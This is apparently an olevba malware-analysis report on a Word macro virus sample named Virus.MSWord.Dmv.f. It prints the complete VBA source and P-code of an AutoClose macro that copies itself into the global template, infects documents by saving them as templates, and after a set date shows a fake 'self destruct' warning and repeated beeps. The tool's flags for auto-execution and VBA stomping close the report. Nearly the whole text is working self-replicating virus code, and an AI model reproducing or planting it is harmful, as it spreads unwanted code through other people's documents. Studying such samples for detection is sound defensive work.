olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Dmv.f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Dmv.f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoClose.bas 
in file: Virus.MSWord.Dmv.f - OLE stream: 'Macros/VBA/AutoClose'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'*********************************************************************'
'* Macro Name: Autoclose                                   *'
'* Date Authored: January 5, 1997                          *'
'* Strain: Macro.WinWord.Loophole.1                        *'
'* Function: To detect, and alert Supervisors of security loopholes  *'
'*           by representing a dangerous DMV, and providing them with*'
'*           valuable insight to the nature of macro Virii         *'
'* Author: PuP                                             *'
'*********************************************************************'
Public Sub MAIN()
Dim head$
Dim m$
Dim havefriends
Dim cycle
Dim a$
Dim copied
Dim logic
Dim d$
Dim tdate
Dim rand
Dim beeps
head$ = "Macro Virus Security Loophole"
m$ = "Hey there! This is an inert "
m$ = m$ + "macro virus.  It is the direct result of the neglagence of"
m$ = m$ + " your supervisor.  Please ask him/her to tighten up "
m$ = m$ + "security, because this could have been a killer, "
m$ = m$ + "and ruined your file(s)!"
m$ = m$ + Chr(13) + "                           -Pup"

' Check and see if the AutoClose macro is installed in global.
If WordBasic.CountWindows() <> 0 Then
havefriends = 0
For cycle = 1 To WordBasic.CountMacros(0)
    If WordBasic.[MacroName$](cycle, 0) = "AutoClose" Then
        havefriends = 1
    End If
Next cycle

' Get the current document name.
If WordBasic.[Left$](WordBasic.[WindowName$](), 8) <> "Document" Then
    a$ = WordBasic.[WindowName$]() + ":AutoClose"
End If

' If AutoClose isn't present, then copy it to NORMAL.DOT.
If havefriends = 0 Then
    ' The following code infects a document each time it is closed.
    ' This effectively spreads the macro virus each time an infected
    ' document is opened by Word.
    WordBasic.MacroCopy a$, "Global:AutoClose", 1
    copied = 1

Else
    ' If AutoClose is already global and the file hasn't been
    ' infected yet, save the current file as a
    ' template instead of a document so the macro can be attached.
    ' See if AutoClose is already in the document.  Don't need
    ' to check names because the virus would be the only code
    ' putting a macro in a document.

    havefriends = 0
    If WordBasic.CountMacros(1) <> 0 Then
        havefriends = 1
    End If
    If havefriends = 0 Then
        ' Save the document as a template.
        WordBasic.FileSaveAs Format:=1
        ' Then copy the AutoClose macro from NORMAL.DOT.
        If a$ <> "" Then WordBasic.MacroCopy "Global:AutoClose", a$, 1
        copied = 1
    End If
End If
    ' This is the payload that made you aware of this security loop hole
    logic = 970125
    d$ = WordBasic.[Date$]()
    tdate = WordBasic.Val(WordBasic.[Right$](d$, 2) + WordBasic.[Left$](d$, 2) + Mid(d$, 4, 2))
    If copied > 0 And logic <= tdate Then
            rand = WordBasic.Int(Rnd() * 49) + 1
            If rand Mod 10 = 0 Then
                WordBasic.Beep
                WordBasic.MsgBox m$, head$, 16
            ElseIf rand Mod 31 = 0 Then
                WordBasic.MsgBox "This computer will self destruct in 5 minutes", head$, 16
                WordBasic.WaitCursor 1
                For beeps = 1 To 150
                    WordBasic.Beep
                Next beeps
            End If
    End If
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Dmv.f
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/AutoClose - 6734 bytes
' Line #0:
' Line #1:
' 	QuoteRem 0x0000 0x0046 "*********************************************************************'"
' Line #2:
' 	QuoteRem 0x0000 0x003C "* Macro Name: Autoclose                                   *'"
' Line #3:
' 	QuoteRem 0x0000 0x003C "* Date Authored: January 5, 1997                          *'"
' Line #4:
' 	QuoteRem 0x0000 0x003C "* Strain: Macro.WinWord.Loophole.1                        *'"
' Line #5:
' 	QuoteRem 0x0000 0x0046 "* Function: To detect, and alert Supervisors of security loopholes  *'"
' Line #6:
' 	QuoteRem 0x0000 0x0046 "*           by representing a dangerous DMV, and providing them with*'"
' Line #7:
' 	QuoteRem 0x0000 0x0044 "*           valuable insight to the nature of macro Virii         *'"
' Line #8:
' 	QuoteRem 0x0000 0x003C "* Author: PuP                                             *'"
' Line #9:
' 	QuoteRem 0x0000 0x0046 "*********************************************************************'"
' Line #10:
' 	FuncDefn (Public Sub MAIN())
' Line #11:
' 	Dim 
' 	VarDefn head
' Line #12:
' 	Dim 
' 	VarDefn m
' Line #13:
' 	Dim 
' 	VarDefn havefriends
' Line #14:
' 	Dim 
' 	VarDefn cycle
' Line #15:
' 	Dim 
' 	VarDefn a
' Line #16:
' 	Dim 
' 	VarDefn copied
' Line #17:
' 	Dim 
' 	VarDefn logic
' Line #18:
' 	Dim 
' 	VarDefn d
' Line #19:
' 	Dim 
' 	VarDefn tdate
' Line #20:
' 	Dim 
' 	VarDefn rand
' Line #21:
' 	Dim 
' 	VarDefn beeps
' Line #22:
' 	LitStr 0x001D "Macro Virus Security Loophole"
' 	St head$ 
' Line #23:
' 	LitStr 0x001C "Hey there! This is an inert "
' 	St m$ 
' Line #24:
' 	Ld m$ 
' 	LitStr 0x003A "macro virus.  It is the direct result of the neglagence of"
' 	Add 
' 	St m$ 
' Line #25:
' 	Ld m$ 
' 	LitStr 0x0034 " your supervisor.  Please ask him/her to tighten up "
' 	Add 
' 	St m$ 
' Line #26:
' 	Ld m$ 
' 	LitStr 0x0031 "security, because this could have been a killer, "
' 	Add 
' 	St m$ 
' Line #27:
' 	Ld m$ 
' 	LitStr 0x0018 "and ruined your file(s)!"
' 	Add 
' 	St m$ 
' Line #28:
' 	Ld m$ 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x001F "                           -Pup"
' 	Add 
' 	St m$ 
' Line #29:
' Line #30:
' 	QuoteRem 0x0000 0x003D " Check and see if the AutoClose macro is installed in global."
' Line #31:
' 	Ld WordBasic 
' 	ArgsMemLd CountWindows 0x0000 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #32:
' 	LitDI2 0x0000 
' 	St havefriends 
' Line #33:
' 	StartForVariable 
' 	Ld cycle 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	For 
' Line #34:
' 	Ld cycle 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x0009 "AutoClose"
' 	Eq 
' 	IfBlock 
' Line #35:
' 	LitDI2 0x0001 
' 	St havefriends 
' Line #36:
' 	EndIfBlock 
' Line #37:
' 	StartForVariable 
' 	Ld cycle 
' 	EndForVariable 
' 	NextVar 
' Line #38:
' Line #39:
' 	QuoteRem 0x0000 0x001F " Get the current document name."
' Line #40:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitDI2 0x0008 
' 	Ld WordBasic 
' 	ArgsMemLd [Left$] 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	IfBlock 
' Line #41:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000A ":AutoClose"
' 	Add 
' 	St a$ 
' Line #42:
' 	EndIfBlock 
' Line #43:
' Line #44:
' 	QuoteRem 0x0000 0x0038 " If AutoClose isn't present, then copy it to NORMAL.DOT."
' Line #45:
' 	Ld havefriends 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #46:
' 	QuoteRem 0x0004 0x003E " The following code infects a document each time it is closed."
' Line #47:
' 	QuoteRem 0x0004 0x003F " This effectively spreads the macro virus each time an infected"
' Line #48:
' 	QuoteRem 0x0004 0x001C " document is opened by Word."
' Line #49:
' 	Ld a$ 
' 	LitStr 0x0010 "Global:AutoClose"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #50:
' 	LitDI2 0x0001 
' 	St copied 
' Line #51:
' Line #52:
' 	ElseBlock 
' Line #53:
' 	QuoteRem 0x0004 0x0038 " If AutoClose is already global and the file hasn't been"
' Line #54:
' 	QuoteRem 0x0004 0x0029 " infected yet, save the current file as a"
' Line #55:
' 	QuoteRem 0x0004 0x003D " template instead of a document so the macro can be attached."
' Line #56:
' 	QuoteRem 0x0004 0x0039 " See if AutoClose is already in the document.  Don't need"
' Line #57:
' 	QuoteRem 0x0004 0x0038 " to check names because the virus would be the only code"
' Line #58:
' 	QuoteRem 0x0004 0x001F " putting a macro in a document."
' Line #59:
' Line #60:
' 	LitDI2 0x0000 
' 	St havefriends 
' Line #61:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0001 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #62:
' 	LitDI2 0x0001 
' 	St havefriends 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	Ld havefriends 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #65:
' 	QuoteRem 0x0008 0x0021 " Save the document as a template."
' Line #66:
' 	LitDI2 0x0001 
' 	ParamNamed Format$ 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #67:
' 	QuoteRem 0x0008 0x002F " Then copy the AutoClose macro from NORMAL.DOT."
' Line #68:
' 	Ld a$ 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0010 "Global:AutoClose"
' 	Ld a$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' 	EndIf 
' Line #69:
' 	LitDI2 0x0001 
' 	St copied 
' Line #70:
' 	EndIfBlock 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	QuoteRem 0x0004 0x0043 " This is the payload that made you aware of this security loop hole"
' Line #73:
' 	LitDI4 0xCD8D 0x000E 
' 	St logic 
' Line #74:
' 	Ld WordBasic 
' 	ArgsMemLd [Date$] 0x0000 
' 	St d$ 
' Line #75:
' 	Ld d$ 
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [Right$] 0x0002 
' 	Ld d$ 
' 	LitDI2 0x0002 
' 	Ld WordBasic 
' 	ArgsMemLd [Left$] 0x0002 
' 	Add 
' 	Ld d$ 
' 	LitDI2 0x0004 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd Val 0x0001 
' 	St tdate 
' Line #76:
' 	Ld copied 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld logic 
' 	Ld tdate 
' 	Le 
' 	And 
' 	IfBlock 
' Line #77:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0031 
' 	Mul 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	LitDI2 0x0001 
' 	Add 
' 	St rand 
' Line #78:
' 	Ld rand 
' 	LitDI2 0x000A 
' 	Mod 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #79:
' 	Ld WordBasic 
' 	ArgsMemCall Beep 0x0000 
' Line #80:
' 	Ld m$ 
' 	Ld head$ 
' 	LitDI2 0x0010 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0003 
' Line #81:
' 	Ld rand 
' 	LitDI2 0x001F 
' 	Mod 
' 	LitDI2 0x0000 
' 	Eq 
' 	ElseIfBlock 
' Line #82:
' 	LitStr 0x002D "This computer will self destruct in 5 minutes"
' 	Ld head$ 
' 	LitDI2 0x0010 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0003 
' Line #83:
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall WaitCursor 0x0001 
' Line #84:
' 	StartForVariable 
' 	Ld beeps 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0096 
' 	For 
' Line #85:
' 	Ld WordBasic 
' 	ArgsMemCall Beep 0x0000 
' Line #86:
' 	StartForVariable 
' 	Ld beeps 
' 	EndForVariable 
' 	NextVar 
' Line #87:
' 	EndIfBlock 
' Line #88:
' 	EndIfBlock 
' Line #89:
' 	EndIfBlock 
' Line #90:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

